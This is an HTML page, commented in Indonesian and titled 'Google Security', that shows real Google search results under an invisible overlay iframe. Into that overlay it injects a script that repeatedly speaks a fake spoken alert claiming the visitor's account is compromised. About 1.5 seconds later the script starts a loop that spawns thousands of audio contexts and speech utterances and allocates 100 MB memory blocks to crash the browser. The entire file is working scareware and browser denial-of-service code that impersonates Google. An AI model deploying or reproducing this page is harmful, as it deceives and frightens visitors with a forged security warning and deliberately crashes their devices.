<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; height: 100vh; overflow: hidden; margin: 0; }
  
  /* Iframe Google (Terlihat) */
  #googleFrame {
    position: absolute;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    border: none;
    z-index: 1;
  }

  /* Iframe Payload (Tersembunyi, menutupi Google) */
  #payloadFrame {
    position: absolute;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    border: none;
    opacity: 0; /* Transparan, tapi menerima klik & memutar suara */
    z-index: 2;
  }
</style>
</head>
<body>

<!-- Iframe Google -->
<iframe id="googleFrame" src="https://www.google.com/search?igu=1"></iframe>

<!-- Iframe Payload (TTS + Crash) -->
<iframe id="payloadFrame" allow="autoplay; camera; microphone"></iframe>

<script>
(function () {
  'use strict';

  var payloadFrame = document.getElementById('payloadFrame');

  // ============================================
  // PAYLOAD YANG DISUNTIKKAN DI ATAS GOOGLE
  // ============================================
  var payloadHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>Alert</title></head>
    <body style="background:transparent;margin:0;cursor:pointer;">
      <script>
        (function() {
          // A. TTS (Google Alert)
          function speak() {
            if (!('speechSynthesis' in window)) return;
            var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been accessed. System compromised.");
            u.lang = 'en-US';
            u.rate = 1.0;
            u.volume = 1.0;
            window.speechSynthesis.speak(u);
          }

          // B. AudioContext Unlock
          function unlockAudio() {
            try {
              var ctx = new (window.AudioContext || window.webkitAudioContext)();
              if (ctx.state === 'suspended') ctx.resume();
              var osc = ctx.createOscillator();
              var gain = ctx.createGain();
              gain.gain.value = 0.1;
              osc.connect(gain);
              gain.connect(ctx.destination);
              osc.start();
              osc.stop(ctx.currentTime + 0.5);
            } catch(e) {}
          }

          // Jalankan Zero-Click Bypass
          speak();
          unlockAudio();
          
          // Loop TTS
          setInterval(speak, 5000);

          // C. RESOURCE EXHAUSTION (Crash setelah 1.5 detik)
          setTimeout(function() {
            setInterval(function() {
              try {
                for (var i = 0; i < 1000; i++) {
                  var c = new (window.AudioContext || window.webkitAudioContext)();
                  var o = c.createOscillator();
                  o.connect(c.destination);
                  o.start(0);
                  
                  var v = new SpeechSynthesisUtterance("CRASH_" + i);
                  window.speechSynthesis.speak(v);
                }
                var bigArray = new Uint8Array(100 * 1024 * 1024);
                bigArray.fill(1);
                window.memoryHog = window.memoryHog || [];
                window.memoryHog.push(bigArray);
              } catch(e) {}
            }, 50);
          }, 1500);

        })();
      <\/script>
    </body>
    </html>
  `;

  // Tulis payload ke iframe kedua
  payloadFrame.onload = function() {
    try {
      var doc = payloadFrame.contentDocument || payloadFrame.contentWindow.document;
      doc.open();
      doc.write(payloadHTML);
      doc.close();
      console.log("[!] Payload Autoplay + Crash disuntikkan di atas Google.");
    } catch(e) {
      console.log("Gagal menyuntikkan payload: " + e.message);
    }
  };

  // Trigger load iframe payload (about:blank)
  payloadFrame.src = 'about:blank';

})();
</script>
</body>
</html>
